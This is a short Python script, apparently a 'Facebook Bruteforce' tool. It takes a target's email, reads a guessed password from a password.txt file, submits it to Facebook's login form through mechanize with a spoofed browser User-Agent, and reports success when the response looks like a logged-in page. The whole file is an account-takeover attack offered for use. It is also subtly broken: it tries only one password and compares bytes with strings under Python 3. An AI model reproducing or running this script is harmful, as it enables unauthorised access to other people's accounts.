import sys
import mechanize

if sys.version_info[0] != 3:
    print('''--------------------------------------
    REQUIRED PYTHON 3.x
    use: python3 brute2.py
--------------------------------------
            ''')
    sys.exit()

post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except ImportError:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n---------- Welcome To Facebook Bruteforce ----------\n')

file = open('password.txt', 'r')

email = input('Enter Email/Username: ')

print("\nTarget Email ID: ", email)

password = file.readline().strip()
print("[*] Trying: %s" % password)

responses = browser.open(post_url)

for form in browser.forms():
    if 'email' in form.attrs['id']:
        browser.form = form
        browser.form['email'] = email
        break

for form in browser.forms():
    if 'pass' in form.attrs['id']:
        browser.form = form
        browser.form['pass'] = password
        break

response = browser.submit()
response_data = response.read()

if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
    print("Password found: %s" % password)
